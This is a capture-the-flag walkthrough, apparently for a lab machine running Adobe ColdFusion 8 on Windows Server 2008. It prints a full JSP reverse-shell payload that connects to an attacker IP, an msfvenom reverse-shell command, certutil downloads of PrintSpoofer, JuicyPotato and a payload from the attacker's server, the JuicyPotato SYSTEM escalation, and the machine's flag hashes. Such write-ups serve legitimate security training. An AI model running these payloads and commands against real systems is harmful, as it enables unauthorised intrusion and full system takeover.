
## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -p- 10.129.36.251
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 09:40 -0500
Nmap scan report for 10.129.36.251
Host is up (0.027s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 157.57 seconds
```

Port 8500 seems to be an webserver which is running an "JRun Web Server".

```
nmap -sCV -p 135,8500,49154 10.129.36.251
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 09:52 -0500
Nmap scan report for 10.129.36.251
Host is up (0.024s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.13 seconds
```

Upon accessing the webpage we get 2 endpoints displayed. After enumerating sometime I found an exposed /admin panel. Which provides an login page and hosts "ADOBE Coldfusion 8" Web Application.

```
http://10.129.36.251:8500/CFIDE/administrator/
```

## Vulnerability Assessment

Let's check for CVE's!

```
searchsploit ADOBE Coldfusion 8           
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                         | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                      | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                         | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                          | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                 | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                               | multiple/webapps/45979.txt
Adobe ColdFusion 2023.6 - Remote File Read                                                                  | multiple/webapps/52387.py
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                           | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                          | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                         | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                   | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                      | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                             | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                   | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scrip | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting      | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting       | cfm/webapps/33168.txt
Adobe ColdFusion versions 2018_15 (and earlier) and 2021_5 and earlier - Arbitrary File Read                | multiple/webapps/51875.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

Let's check out the RCE Exploit out.

```
locate cfm/webapps/50057.py    
/usr/share/exploitdb/exploits/cfm/webapps/50057.py
```

## Initial Access

Modified the exploit variables to mine.

```
lhost, lport, rhost
```

Ran the exploit and gained RCE as user "arctic\tolis".

```
python3 50057.py 

Generating a payload...
Payload size: 1498 bytes
Saved as: 0da729e200354306a0a14cfa17a582ff.jsp

Priting request...
Content-type: multipart/form-data; boundary=c2edb97385d344ffb29f5d1b4aeb458b
Content-length: 1699

--c2edb97385d344ffb29f5d1b4aeb458b
Content-Disposition: form-data; name="newfile"; filename="0da729e200354306a0a14cfa17a582ff.txt"
Content-Type: text/plain

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream dz;
    OutputStream qP;

    StreamConnector( InputStream dz, OutputStream qP )
    {
      this.dz = dz;
      this.qP = qP;
    }

    public void run()
    {
      BufferedReader uc  = null;
      BufferedWriter jnl = null;
      try
      {
        uc  = new BufferedReader( new InputStreamReader( this.dz ) );
        jnl = new BufferedWriter( new OutputStreamWriter( this.qP ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = uc.read( buffer, 0, buffer.length ) ) > 0 )
        {
          jnl.write( buffer, 0, length );
          jnl.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( uc != null )
          uc.close();
        if( jnl != null )
          jnl.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.161", 8500 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--c2edb97385d344ffb29f5d1b4aeb458b--


Sending request and printing response...


                <script type="text/javascript">
                        window.parent.OnUploadCompleted( 0, "/userfiles/file/0da729e200354306a0a14cfa17a582ff.jsp/0da729e200354306a0a14cfa17a582ff.txt", "0da729e200354306a0a14cfa17a582ff.txt", "0" );
                </script>


Printing some information for debugging...
lhost: 10.10.14.161
lport: 8500
rhost: 10.129.36.251
rport: 8500
payload: 0da729e200354306a0a14cfa17a582ff.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 8500 ...
connect to [10.10.14.161] from (UNKNOWN) [10.129.36.251] 49330







Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

Retrieved user.txt in C:\Users\tolis\Desktop.

```
a27dc74217932851c55b56defe165df6
```
## Privilege Escalation

Enumerated privileges of user "arctic\tolis".

```
C:\Temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

"SeImpersonatePrivilege" is enabled for this user, let's try and utilize PrintSpoofer.exe

Started up python server locally.

```
python3 -m http.server 8081
```

Downloaded PrintSpoofer.exe onto target machine.

```
C:\Temp>certutil -urlcache -split -f http://10.10.14.161:8081/PrintSpoofer.exe PrintSpoofer.exe
certutil -urlcache -split -f http://10.10.14.161:8081/PrintSpoofer.exe PrintSpoofer.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

Executed it, but nothing happened.

```
C:\Temp>PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c cmd.exe
```

Let's enumerate further.

```
C:\Temp>systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
```

The Server is an Windows Server 2008 and there is no Patches applied, which means it's very outdated. Let's try & utilize JuicyPotato.exe again.

Downloaded the .exe from my local machine to the target server.

```
C:\Temp>certutil -urlcache -split -f http://10.10.14.161:8081/JuicyPotato.exe JuicyPotato.exe
certutil -urlcache -split -f http://10.10.14.161:8081/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
```

Generated malicious payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > rev.exe
```

Downloaded it onto the target machine.

```
C:\Temp>certutil -urlcache -split -f http://10.10.14.161:8081/rev.exe rev.exe
certutil -urlcache -split -f http://10.10.14.161:8081/rev.exe rev.exe
****  Online  ****
  0000  ...
  1e00
CertUtil: -URLCache command completed successfully.
```

Started up listener on port 443.

```
nc -lvnp 443
```


Executed JuicyPotato with our malicious rev shell script and the CLSID of an system process.

```
C:\Temp>JuicyPotato.exe -t * -p rev.exe -l 443 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
JuicyPotato.exe -t * -p rev.exe -l 443 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 443
....
[+] authresult 0
{69AD4AEE-51BE-439b-A92C-86AE490E8B30};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Gained RCE as user "nt authority\system".

```
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.161] from (UNKNOWN) [10.129.36.251] 49403
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
3baf5445e041fe3d73b0846b96b897e5
```